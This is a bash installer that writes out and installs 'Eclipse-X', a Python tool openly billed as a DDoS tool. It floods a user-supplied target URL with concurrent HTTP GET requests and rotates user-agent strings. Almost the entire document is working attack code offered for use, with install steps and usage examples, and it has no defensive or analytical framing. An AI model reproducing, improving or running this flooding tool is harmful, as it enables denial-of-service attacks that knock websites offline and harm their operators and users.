#!/bin/bash
# ECLIPSE-X SIMPLE INSTALLER
# By Dp75x | GitHub: Daffastorevps

echo "[+] Installing Eclipse-X..."

# Update system
apt update && apt upgrade -y

# Install Python & pip
apt install python3 python3-pip git curl -y

# Create directory
mkdir -p /opt/Eclipse-X
cd /opt/Eclipse-X

# Create eclipse_x.py
cat > eclipse_x.py << 'EOF'
#!/usr/bin/env python3
"""
Eclipse-X Simple DDoS | By Dp75x | GitHub: Daffastorevps
"""
import asyncio
import aiohttp
import random
import sys
import os
import time

# Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    END = '\033[0m'

# User agents
agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S901B) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1'
]

class EclipseX:
    def __init__(self, target, connections=5000):
        self.target = target
        self.conns = connections
        self.running = False
        
    async def http_flood(self):
        while self.running:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        self.target,
                        headers={'User-Agent': random.choice(agents)},
                        timeout=1
                    ):
                        pass
            except:
                pass
    
    def start(self):
        self.running = True
        print(f"{Colors.RED}[+] Attacking {self.target} {Colors.END}")
        print(f"{Colors.YELLOW}[+] Press Ctrl+C to stop {Colors.END}")
        
        # Start multiple workers
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        tasks = []
        for _ in range(min(self.conns, 100)):
            tasks.append(self.http_flood())
        
        try:
            loop.run_until_complete(asyncio.gather(*tasks))
        except KeyboardInterrupt:
            self.running = False
            print(f"{Colors.RED}[+] Attack stopped {Colors.END}")

# Main
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"{Colors.YELLOW}Usage: python3 eclipse_x.py <target_url> [connections]{Colors.END}")
        print(f"{Colors.CYAN}Example: python3 eclipse_x.py https://example.com 5000{Colors.END}")
        sys.exit(1)
    
    target = sys.argv[1]
    conns = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    
    print(f"{Colors.RED}==========================================={Colors.END}")
    print(f"{Colors.CYAN}Eclipse-X DDoS Tool | By Dp75x{Colors.END}")
    print(f"{Colors.CYAN}GitHub: Daffastorevps{Colors.END}")
    print(f"{Colors.RED}==========================================={Colors.END}")
    
    attack = EclipseX(target, conns)
    attack.start()
EOF

# Make executable
chmod +x eclipse_x.py

# Install aiohttp only
pip3 install aiohttp --no-warn-script-location

echo "[+] Installation complete!"
echo "[+] Run: cd /opt/Eclipse-X && python3 eclipse_x.py <target_url>"
echo "[+] Example: python3 eclipse_x.py https://example.com 5000"
echo "[+] GitHub: Daffastorevps | By: Dp75x"
